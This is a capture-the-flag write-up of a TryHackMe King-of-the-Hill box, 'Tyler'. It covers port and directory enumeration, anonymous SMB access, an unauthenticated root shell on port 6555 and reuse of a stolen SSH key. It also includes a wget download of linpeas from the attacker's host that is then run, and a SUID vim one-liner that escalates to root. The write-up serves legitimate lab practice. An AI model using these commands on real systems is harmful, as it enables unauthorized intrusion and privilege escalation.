# Tyler.THM - Koth



# enum

```bash
nmap tyler.thm -p- 
nmap tyler.thm -sV -sC 
nmap tyler.thm 
```

we got 2 http servers, 80 8080
```bash 
gobuster dir -u tyler.thm:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
gobuster dir -u tyler.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
```

we also get some smb ports and unknown port on 6555.
lets start enum the smb to see if there are any shere's that we can enter

# SMB

```bash
smbclient -L \\\\tyler.thm\\

Enter WORKGROUP\root's password:  # NO PASSWORD JUST PRESS ENTER
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	public          Disk      
	IPC$            IPC       IPC Service (Samba 4.9.1)
Reconnecting with SMB1 for workgroup listing.
Anonymous login successful

	Server               Comment
	---------            -------

	Workgroup            Master
	---------            -------
	SAMBA                TYLER
```
lets check all the folders

```bash
$ root@kali:# smbclient \\\\tyler.thm\\print$

Enter WORKGROUP\root's password: 
Anonymous login successful
tree connect failed: NT_STATUS_ACCESS_DENIED

$ root@kali:~/Desktop/CTF/THM/#KOTH/tyler# smbclient \\\\tyler.thm\\IPC$

Enter WORKGROUP\root's password: 
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> ls
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*

$ root@kali:# smbclient \\\\tyler.thm\\public

Enter WORKGROUP\root's password: 
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Mar 25 17:09:50 2020
  ..                                  D        0  Wed Mar 25 17:02:28 2020
  flag.txt                            N       33  Wed Mar 25 17:08:05 2020
  alert.txt                           N       50  Wed Mar 25 17:09:50 2020

		13092864 blocks of size 1024. 8517996 blocks available
smb: \> mget *
Get file flag.txt? 
Get file alert.txt? 
smb: \> 
```

so we got a flag but still we are far off...
in the alert.txt file we get some code that i think  its a rabbit hole..

### port 6555

from out nmap scan we found port 6555. lets try to see what it contains

```bash
nc tyler.thm 6555
whoami
root
```

as simple as that we got outself a root shell on the machine! lets declare a king.
```bash
cd /root
ls -al

total 24
dr-xr-x---  3 root root 119 Mar 25 15:25 .
dr-xr-xr-x 17 root root 244 Mar 25 09:59 ..
-rw-r--r--  1 root root  18 Dec 28  2013 .bash_logout
-rw-r--r--  1 root root 176 Dec 28  2013 .bash_profile
-rw-r--r--  1 root root 176 Dec 28  2013 .bashrc
-rw-r--r--  1 root root 100 Dec 28  2013 .cshrc
-rw-r--r--  1 root root  33 Mar 25 15:25 flag.txt
drwx------  2 root root  61 Mar 25 15:23 .ssh
-rw-r--r--  1 root root 129 Dec 28  2013 .tcshrc
```

what? no king.txt?
so this is a "rabbit hole" somewhat and this shell is seperated from the main machine somehow
I tried to enumerate and see if i can gather some info on the main machine

```bash
cd /root/.ssh
cat id_rsa.pub

ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC+0qTaj8PluXd4pyYNMGPLbP2ZTwh4I8hVCNnkzaL7oXXbZolVtehOCawy+DOgnccIEHUqMgEvOEEs+2u/+UpWxL7t1QSnyLvMrMKAnLXBQDzr2uJx7Ljhli8wv7nIX83EcpzU7M2bViGGpXhxOAQa6Ud7pRVXekh71qZI22I7Zg/NPPSzsMbm0CQrJ9Q+J2kugu/EK4VQsR1COMs+7ssd0gkHQ8PooLHr1+x4Trf+DRb/H02hjl1TaZ589CixlQQNUfHzLjXnnuE7qslcX8c6Oe7sv7e808M87ZokdhrifWZrfwCxaZ54D6xWYdSScYzMKqLh0HQxO3KokicRgTJx tdurden@tyler
```

ok! we got a user "tdurden" and his id_rsa files
so from a state that i thought that this is defenetly a rabbithole im now sure that this is the way to go.

I'll copy id_rsa to my own machine and try to login
```bash
chmod 600 id_rsa

ssh tdurden@10.10.106.164 -i idrsa 
Last login: Mon Jul 13 05:55:42 2020 from ip-10-9-6-216.eu-west-1.compute.internal


[tdurden@tyler ~]$ 
[tdurden@tyler ~]$ 
[tdurden@tyler ~]$ 
[tdurden@tyler ~]$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
polkitd:x:999:998:User for polkitd:/:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
postfix:x:89:89::/var/spool/postfix:/sbin/nologin
chrony:x:998:996::/var/lib/chrony:/sbin/nologin
tdurden:x:1000:1000:Tyler Durden:/home/tdurden:/bin/bash
apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
narrator:x:1002:1002::/home/narrator:/bin/bash
tss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin
nginx:x:997:994:Nginx web server:/var/lib/nginx:/sbin/nologin
mysql:x:27:27:MariaDB Server:/var/lib/mysql:/sbin/nologin
librenms:x:996:993::/opt/librenms:/bin/bash

```
YES! we got a shell on the 'main' machine
now we can enumerate some more.
I'll try to get linpeas

```bash
cd /tmp
wget 10.9.6.216/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

we got from linpease a SUID on vim. this must be it!
lets search for SUID shell on 'GTFO bins'

https://gtfobins.github.io/

```bash
vim -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
^[[2;2R^[]11;rgb:2929/2d2d/2e2e^Gsh-4.2# 2R11;rgb:2929/2d2d/2e2ewhoami
sh: 2R11: command not found
sh: rgb:2929/2d2d/2e2ewhoami: No such file or directory
sh-4.2# whoami
root
sh-4.2# 
```

<!---
flags:

decoy machine /root/flag.txt
main machine 
/home/user/flag.txt
/root/root.txt

smb tyler.thm/public flag.txt + alert.txt
--->
